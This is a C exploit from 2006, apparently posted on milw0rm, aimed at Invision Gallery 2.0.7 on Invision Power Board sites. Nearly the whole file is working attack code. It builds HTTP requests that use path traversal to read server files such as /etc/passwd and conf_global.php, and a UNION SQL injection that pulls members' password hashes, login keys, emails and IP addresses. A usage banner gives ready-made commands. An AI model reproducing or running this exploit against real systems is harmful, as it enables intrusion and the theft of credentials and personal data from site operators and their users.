<html><head><title>Invision Gallery <= 2.0.7 ReadFile() & SQL Injection Exploit</title></head><pre>/*
     _  _     _ _ _  __     _      _   _
    | || |___| | | |/ /_ _ (_)__ _| |_| |_ ___
    | __ / -_) | | ' &lt;| ' \| / _` | ' \  _(_-&lt;
    |_||_\___|_|_|_|\_\_||_|_\__, |_||_\__/__/
      hellknights.void.ru    |___/  
                 (c)oded by _1nf3ct0r_

 Invision Gallery =&gt; 2.0.7 ReadFile() &amp; SQL injection exploit
 
+-------------+
|   Uzage:    |
+-------------+
[+] ReadFile():
  - syntax:
  readfile 1 &lt;host&gt; &lt;pathtoindex&gt; &lt;localfile&gt; 
  readfile 2 &lt;host&gt; &lt;pathtoindex&gt; &lt;localfile&gt;  // try it if readfile[1] failed ;)
   - params: 
  &lt;localfile&gt; -  path to local file (../file), for example: ../../../../../etc/passwd
   s0, if u want to get local path to IPB try this: ../../hellknightscrewxploit :) 
   - examples:
   readfile 1 asd.ru index.php ../../../../../../etc/passwd
   readfile 1 asd.ru forum/index.php ../../conf_global.php
   readfile 1 asd.ru forum/index.php ../../conf_global.php%00
   
[+] SQL-injection:
  - syntax
  sqlinject &lt;host&gt; &lt;pathtoindex&gt; &lt;member_id&gt; &lt;prefix&gt; &lt;column&gt; &lt;table&gt;
  getprefix &lt;host&gt; &lt;pathtoindex&gt;   // get database prefix from IPB error :) 
  - params:
  &lt;member_id&gt; -  member's id for SQL-injection result, for example: 1
  &lt;column&gt;    -  ipb members' column to get. for example: ip_adress, email.
  &lt;table&gt;     -  ipb table to use. for example: member
  &lt;prefix&gt;    -  database prefix. 
  - examples:
  ig.exe sqlinject asd.ru index.php legacy_password ibf_ members 1  
  ig.exe sqlinject asd.ru index.php member_login_key  ibf_ members 1
  ig.exe sqlinject asd.ru forum/index.php ip_adress ibf_ member 5
  
[~] sorry, but i`m too lazy 2 optimize this c0de... 
[~] Music: Orbital - Halcyon and On and On (OST Hackers) :) 
[~] compiled with LCC without any warnings

Gr33tz: blackybr, 1dt.w0lf, ShadOS, ZaCo, SkvoznoY, HATS-Team 
             itz public c0de n0w, have phun :&gt; 
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;winsock2.h&gt;

DWORD resolve(char *host)
{
    DWORD ret = 0;
    struct hostent * hp = gethostbyname(host);
    if (!hp) ret = inet_addr(host);
    if ((!hp)&amp;&amp;(ret == INADDR_NONE)) return 0;
    if (hp != NULL) memcpy((void*)&amp;ret, hp-&gt;h_addr,hp-&gt;h_length);
    return ret;
}

int Exploit(char * sendbuffer, char * mode, char * host)
{
	char recvbuffer[10024]; char * temp; 
	memset(recvbuffer,0,10024);

	SOCKET s = socket(AF_INET,SOCK_STREAM,0);
	SOCKADDR_IN webaddr;
		webaddr.sin_addr.S_un.S_addr = resolve(host);
		webaddr.sin_family = AF_INET;
		webaddr.sin_port = htons(80);
	if(connect(s, (struct sockaddr *)&amp;webaddr,sizeof(SOCKADDR_IN))) return -1;
	send(s, sendbuffer, strlen(sendbuffer),0);
	
	int i, j;
	while(i = recv(s,recvbuffer+strlen(recvbuffer),1,0)) 
	for(int i = 0; recvbuffer[i]!=0; ++i)
	{
		if((recvbuffer[i]=='\r')&amp;&amp;(recvbuffer[i+1]=='\n')&amp;&amp;
			(recvbuffer[i+2]=='\r')&amp;&amp;(recvbuffer[i+3]=='\n'))
		{temp = (char*)&amp;recvbuffer[i] + 4;break;}
	}
	
	
	if(strcmp(mode,&quot;readfile&quot;)==0)
	{
	printf(&quot;\n [+] Exploit Result:\n\n%s&quot;, temp);
	return 0;
	}
	
	if(strcmp(mode,&quot;sqlinject&quot;)==0)
	{		
	char * token = NULL; char * injected = NULL; char * parse = NULL;
    token = strtok(temp, &quot;=&quot;); 
	token = strtok(NULL, &quot;=&quot;);
	token = strtok(NULL, &quot;&amp;&quot;);
	token = strtok(NULL, &quot;&amp;&quot;);
	for(int j = 0; j &lt; 2; j++)
		{
    	token = strtok(NULL, &quot;&amp;&quot;);
	    if(j==1){ injected = token; printf(&quot;\n [+] Exploit Result:\n\n%s&quot;, injected); }
		}

	} else { printf(&quot;\n[-] some error. change MODE param\n&quot;); return 0; } 
	return 0;
}

int main(int argc,char * argv[])
{
WSADATA wsaData;
WSAStartup(MAKEWORD(2,2),&amp;wsaData);

		printf(&quot;\n ...............................................................\n&quot;);
        printf(&quot;  Invision Gallery 2.0.7 ReadFile() &amp; SQL injection exploit       \n&quot;);
        printf(&quot;         (c)oded by _1nf3ct0r_ // Hell Knights Crew               \n&quot;);
		printf(&quot;               http://hellknights.void.ru/                        \n&quot;);
		printf(&quot;  Gr33tz: blackybr, 1dt.w0lf, ShadOS, ZaCo, SkvoznoY, HATS-Team   \n&quot;);
		printf(&quot; ...............................................................  \n&quot;);
		
	if (argc == 1) {

printf(&quot;\n\n [+] ReadFile():\n&quot;);
printf(&quot;  - syntax:\n&quot;);
printf(&quot;  readfile 1 &lt;host&gt; &lt;pathtoindex&gt; &lt;localfile&gt; \n&quot;);
printf(&quot;  readfile 2 &lt;host&gt; &lt;pathtoindex&gt; &lt;localfile&gt;   -- try it 1f readfile[1] failed \n&quot;);
printf(&quot;  - params: \n&quot;);
printf(&quot;  &lt;localfile&gt; -  path to local file (../file), f0r example: ../../../../../etc/passwd\n&quot;);
printf(&quot;  s0, 1f u want to get local path to IPB 7ry th1s: ../../hellknightscrewxploit  \n&quot;);
printf(&quot;  - examples:\n&quot;);
printf(&quot;  readfile 1 asd.ru index.php ../../../../../../etc/passwd\n&quot;);
printf(&quot;  readfile 1 asd.ru forum/index.php ../../conf_global.php\n&quot;);
printf(&quot;  readfile 1 asd.ru forum/index.php ../../conf_global.php%00\n\n\n&quot;);
printf(&quot; [+] SQL-injection:\n&quot;);
printf(&quot;  - syntax\n&quot;);
printf(&quot;  sqlinject &lt;host&gt; &lt;pathtoindex&gt; &lt;member_id&gt; &lt;prefix&gt; &lt;column&gt; &lt;table&gt;\n&quot;);
printf(&quot;  getprefix &lt;host&gt; &lt;pathtoindex&gt;   -- get database prefix from IPB error  \n&quot;);
printf(&quot;  - params:\n&quot;);
printf(&quot;  &lt;member_id&gt; -  member's id for SQL-injection result, for example: 1\n&quot;);
printf(&quot;  &lt;column&gt;    -  ipb members' column to get. for example: ip_adress, email.\n&quot;);
printf(&quot;  &lt;table&gt;     -  ipb table to use. f0r example: member\n&quot;);
printf(&quot;  &lt;prefix&gt;    -  database prefix. \n&quot;);
printf(&quot;  - examples:\n&quot;);
printf(&quot;  ig.exe sqlinject asd.ru index.php legacy_password ibf_ members 1  \n&quot;);
printf(&quot;  ig.exe sqlinject asd.ru index.php member_login_key  ibf_ members 1\n&quot;);
printf(&quot;  ig.exe sqlinject asd.ru forum/index.php ip_adress ibf_ member 5\n\n&quot;);
		           return 1;
	               }
	
char * mode = argv[1];


// --- readfile() exploit --- //
if (strcmp(mode,&quot;readfile&quot;)==0)
{ 
char * type = argv[2];
char * path = NULL; path = argv[4];
char * localfile = argv[5];
char * host = argv[3]; 
	if (strcmp(type,&quot;1&quot;)==0)
	{
	char exploit[1024]; 
	strcpy(exploit, &quot;GET /&quot;); 
	strcat(exploit, path); 
	strcat(exploit, &quot;?act=module&amp;module=gallery&amp;cmd=viewimage&amp;img=&amp;file_type=&amp;dir=&quot;);
	strcat(exploit, localfile);
    strcat(exploit, &quot; HTTP/1.0\r\nHost: &quot;);
	strcat(exploit, host); 
	strcat(exploit, &quot;\r\n\r\n&quot;); 
Exploit(exploit, &quot;readfile&quot;, host);

	} 
	else if (strcmp(type,&quot;2&quot;)==0)
	{
	char exploit[1024]; 
	strcpy(exploit, &quot;GET /&quot;); 
	strcat(exploit, path); 
	strcat(exploit, &quot;?act=gallery&amp;code=viewimage&amp;img=index.gif&amp;dir=&quot;);
	strcat(exploit, localfile);
    strcat(exploit, &quot; HTTP/1.0\r\nHost: &quot;);
	strcat(exploit, host); 
	strcat(exploit, &quot;\r\n\r\n&quot;); 
Exploit(exploit, &quot;readfile&quot;, host);
	}

// --- sql-injection exploit --- //
} 
if(strcmp(mode,&quot;sqlinject&quot;)==0)
{
char * host = argv[2]; 
char * path = argv[3];
char * prefix = argv[5];
char * column = argv[4];
char * table = argv[6];
char * id = argv[7];

	char exploit[1024]; 
	strcpy(exploit, &quot;GET /&quot;); 
	strcat(exploit, path); 
	strcat(exploit, &quot;?automodule=gallery&amp;cmd=rate&amp;img=1&amp;rating=1&amp;album=-1%20union%20select%201,&quot;);
	strcat(exploit, column);
	strcat(exploit, &quot;,1,1,1,1,1,1,1,1%20FROM%20&quot;);
	strcat(exploit, prefix);
	strcat(exploit, table);
	strcat(exploit, &quot;%20WHERE%20id=&quot;);
	strcat(exploit, id);
	strcat(exploit, &quot;/*31337*/&quot;);
    strcat(exploit, &quot; HTTP/1.0\r\nHost: &quot;);
	strcat(exploit, host); 
	strcat(exploit, &quot;\r\n\r\n&quot;); 
    Exploit(exploit, &quot;sqlinject&quot;, host);
} 
if (strcmp(mode,&quot;getprefix&quot;)==0)
{ 
char * path = argv[3];
char * host = argv[2]; 
	char exploit[1024]; 
	strcpy(exploit, &quot;GET /&quot;); 
	strcat(exploit, path); 
	strcat(exploit, &quot;?automodule=gallery&amp;cmd=rate&amp;img=1&amp;rating=1&amp;album=-1%20hellknightscrew&quot;);
    strcat(exploit, &quot; HTTP/1.0\r\nHost: &quot;);
	strcat(exploit, host); 
	strcat(exploit, &quot;\r\n\r\n&quot;); 
printf(&quot;\n\n\n[!] u can get database prefix from this error. example: SELECT * FROM &lt;PREFIX&gt;gallery_albums\n\n&quot;);
Exploit(exploit, &quot;readfile&quot;, host);
}

WSACleanup();
	return 0;
}

// milw0rm.com [2006-10-03]</pre></html>